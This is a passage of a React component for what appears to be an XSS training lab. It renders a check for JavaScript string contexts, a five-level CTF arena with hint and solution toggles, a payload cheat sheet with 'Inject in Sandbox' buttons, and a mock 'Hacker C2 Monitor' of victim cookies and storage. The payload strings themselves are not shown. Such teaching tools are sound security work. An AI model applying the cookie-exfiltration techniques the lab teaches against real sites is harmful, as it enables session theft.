                  <div style={{ fontSize: "0.75rem", color: "var(--text-muted)", marginBottom: "0.4rem" }}>
                    <code>&lt;script&gt;var username = &quot;{contextInput}&quot;;&lt;/script&gt;</code>
                  </div>
                  <div style={{ color: "#fb7185" }}>
                    {contextInput.includes("\"") || contextInput.includes("</script>") ? "⚠️ VULNERABLE: String escape or script tag closer" : "Safe JS string literal"}
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* ================= TAB 5: CTF ARENA ================= */}
          {activeTab === "ctf" && (
            <div className="glass-panel" style={{ padding: "1.75rem" }}>
              {/* CTF Header & Level Selector */}
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "1.25rem" }}>
                <div>
                  <h3 style={{ fontSize: "1.3rem", color: "#fff", margin: 0 }}>5-Stage CTF Challenge Arena</h3>
                  <p style={{ fontSize: "0.8rem", color: "var(--text-muted)", margin: 0 }}>
                    Solve progressive challenges to demonstrate mastery of filters, contexts, and token exfiltration.
                  </p>
                </div>
                <div className="badge badge-emerald">
                  {completedLevels.length} / 5 COMPLETED
                </div>
              </div>

              {/* Level Buttons */}
              <div style={{ display: "flex", gap: "0.5rem", marginBottom: "1.5rem" }}>
                {ctfLevels.map((lvl) => {
                  const isDone = completedLevels.includes(lvl.id);
                  const isCur = currentCtfLevel === lvl.id;
                  return (
                    <button
                      key={lvl.id}
                      onClick={() => handleSelectCtfLevel(lvl.id)}
                      className="btn btn-sm"
                      style={{
                        flex: 1,
                        background: isCur ? "rgba(16, 185, 129, 0.3)" : isDone ? "rgba(6, 182, 212, 0.15)" : "rgba(255, 255, 255, 0.05)",
                        border: isCur ? "1px solid var(--accent-emerald)" : isDone ? "1px solid var(--accent-cyan)" : "1px solid var(--border-subtle)",
                        color: isCur ? "#fff" : isDone ? "var(--accent-cyan)" : "var(--text-muted)",
                      }}
                    >
                      {isDone ? <Check size={12} /> : null}
                      <span>Level {lvl.id}</span>
                    </button>
                  );
                })}
              </div>

              {/* Current Level Card */}
              {(() => {
                const lvl = ctfLevels.find((l) => l.id === currentCtfLevel);
                if (!lvl) return null;
                return (
                  <div style={{
                    background: "rgba(2, 6, 23, 0.7)",
                    border: "1px solid var(--border-subtle)",
                    borderRadius: "var(--radius-md)",
                    padding: "1.25rem",
                    marginBottom: "1.25rem"
                  }}>
                    <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "0.5rem" }}>
                      <h4 style={{ fontSize: "1.05rem", color: "#fff", margin: 0 }}>{lvl.title}</h4>
                      <span className="badge badge-amber" style={{ fontSize: "0.68rem" }}>{lvl.category}</span>
                    </div>
                    <p style={{ fontSize: "0.85rem", color: "var(--text-secondary)", marginBottom: "1rem" }}>
                      <strong>Goal:</strong> {lvl.goal}
                    </p>

                    <div style={{ display: "flex", gap: "0.75rem", marginBottom: "1rem" }}>
                      <input
                        type="text"
                        value={ctfInput}
                        onChange={(e) => setCtfInput(e.target.value)}
                        placeholder="Craft your solution payload..."
                        className="input-field input-field-mono"
                        style={{ flex: 1 }}
                      />
                      <button onClick={handleTestCtf} className="btn btn-primary">
                        <Play size={16} />
                        <span>Submit Flag</span>
                      </button>
                    </div>

                    {/* Hints & Solution Toggle */}
                    <div style={{ display: "flex", gap: "0.75rem", fontSize: "0.75rem" }}>
                      <button
                        onClick={() => setShowHint(!showHint)}
                        style={{ background: "none", border: "none", color: "var(--accent-cyan)", cursor: "pointer", display: "flex", alignItems: "center", gap: "0.3rem" }}
                      >
                        <Info size={13} />
                        <span>{showHint ? "Hide Hint" : "Show Hint"}</span>
                      </button>
                      <button
                        onClick={() => setShowSolution(!showSolution)}
                        style={{ background: "none", border: "none", color: "var(--accent-amber)", cursor: "pointer", display: "flex", alignItems: "center", gap: "0.3rem" }}
                      >
                        <Sparkles size={13} />
                        <span>{showSolution ? "Hide Solution" : "Reveal Solution"}</span>
                      </button>
                    </div>

                    {showHint && (
                      <div style={{ marginTop: "0.75rem", padding: "0.6rem 0.8rem", background: "rgba(6, 182, 212, 0.08)", border: "1px solid rgba(6, 182, 212, 0.2)", borderRadius: "4px", color: "var(--text-secondary)", fontSize: "0.78rem" }}>
                        💡 <strong>Hint:</strong> {lvl.hint}
                      </div>
                    )}

                    {showSolution && (
                      <div style={{ marginTop: "0.75rem", padding: "0.6rem 0.8rem", background: "rgba(245, 158, 11, 0.08)", border: "1px solid rgba(245, 158, 11, 0.2)", borderRadius: "4px", color: "#fbbf24", fontSize: "0.78rem", fontFamily: "var(--font-mono)" }}>
                        🔑 <strong>Solution:</strong> {lvl.solution}
                      </div>
                    )}
                  </div>
                );
              })()}
            </div>
          )}

          {/* ================= TAB 6: CHEAT SHEET ================= */}
          {activeTab === "cheatsheet" && (
            <div className="glass-panel" style={{ padding: "1.75rem" }}>
              <div style={{ marginBottom: "1.25rem" }}>
                <h3 style={{ fontSize: "1.3rem", color: "#fff", margin: 0 }}>XSS Payload Cheat Sheet</h3>
                <p style={{ fontSize: "0.8rem", color: "var(--text-muted)", margin: "0.2rem 0 0 0" }}>
                  Curated payloads for testing sanitizers, filter evasion, and execution contexts.
                </p>
              </div>

              <div style={{ display: "flex", flexDirection: "column", gap: "0.75rem" }}>
                {cheatSheetPayloads.map((p, idx) => (
                  <div
                    key={idx}
                    style={{
                      background: "rgba(2, 6, 23, 0.7)",
                      border: "1px solid var(--border-subtle)",
                      borderRadius: "var(--radius-md)",
                      padding: "0.85rem",
                      display: "flex",
                      justifyContent: "space-between",
                      alignItems: "center",
                      gap: "1rem"
                    }}
                  >
                    <div>
                      <div style={{ display: "flex", alignItems: "center", gap: "0.5rem", marginBottom: "0.25rem" }}>
                        <span style={{ fontWeight: 600, fontSize: "0.85rem", color: "#fff" }}>{p.title}</span>
                        <span className="badge badge-cyan" style={{ fontSize: "0.65rem", padding: "0.1rem 0.35rem" }}>{p.cat}</span>
                      </div>
                      <code style={{ fontSize: "0.78rem", color: "var(--accent-emerald)", wordBreak: "break-all" }}>
                        {p.code}
                      </code>
                    </div>

                    <div style={{ display: "flex", gap: "0.4rem", flexShrink: 0 }}>
                      <button
                        onClick={() => injectCheatSheetPayload(p.code)}
                        className="btn btn-primary btn-sm"
                        style={{ fontSize: "0.72rem" }}
                      >
                        Inject in Sandbox
                      </button>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}

        </div>

        {/* RIGHT COLUMN: HACKER C2 MONITOR & VICTIM STATE */}
        <div style={{ position: "sticky", top: "90px" }}>
          <HackerMonitor
            events={events}
            onClear={() => setEvents([])}
            mockCookies={mockCookies}
            mockStorage={mockStorage}
          />
        </div>

      </div>
    </div>
  );
}
